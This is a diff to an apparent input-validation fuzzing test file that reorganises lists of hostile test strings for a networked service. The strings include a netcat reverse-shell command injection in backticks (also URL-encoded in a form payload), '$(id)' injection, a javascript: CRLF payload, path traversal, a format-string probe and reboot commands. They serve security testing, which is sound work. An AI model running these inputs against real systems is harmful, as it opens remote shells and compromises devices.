@@ -60,16 +60,24 @@ def gen_long_string(num):
     l_string = 'a' * num
     return l_string
 
-MALICIOUS_STRINGS = [
-    '',  # No value
-    gen_long_string(257),  # Too long
-    gen_special_string(5),  # Special characters
-    random.choice(WHITESPACE),
-    "`nc\t-e\tsh\t192.168.1.254\t4444`",
+
+FUNCTIONAL_STRINGS = [
+    # Input validation strings that will require specific test conditions
+    '/sbin/firstboot',  # Needs relative path
+    "`nc\t-e\tsh\t192.168.1.254\t4444`",  # Should be node ip
     'name=jjgjunique&description=jjj&ipaddr=127.0.0.5&uuid=%60nc%09-e%09sh%09192.168.1.254%094444%60&type=Community&icon=%2Ficon&port=80&ttl=0',
     '$(id)',
     'javascript://127.0.0.1/?%0d%0aalert(document.domain)',
     '../../../README.md%20',
+]
+
+
+MALICIOUS_STRINGS = [
+    # Input validation strings
+    '',  # No value
+    gen_long_string(257),  # Change to test range of overlength strings
+    gen_special_string(5),  # Special characters
+    random.choice(WHITESPACE),
     'AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x',
     '0.0.0.0',
     '-124.134.23.1',
@@ -78,8 +86,6 @@ MALICIOUS_STRINGS = [
     # http://farmdev.com/talks/unicode/
     ' £ € « » ♠ ♣ ♥ ♦ ¿ �',  # \xc2 (&nbsp;) Causes encoding error.
     '{ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,a,a,a,a,a,a,a,a }',
-    '/sbin/reboot',  # Probably needs relative path
-    '/sbin/firstboot',
     '(╯°□°）╯︵ ┻━┻',
     '65537',
     '1',
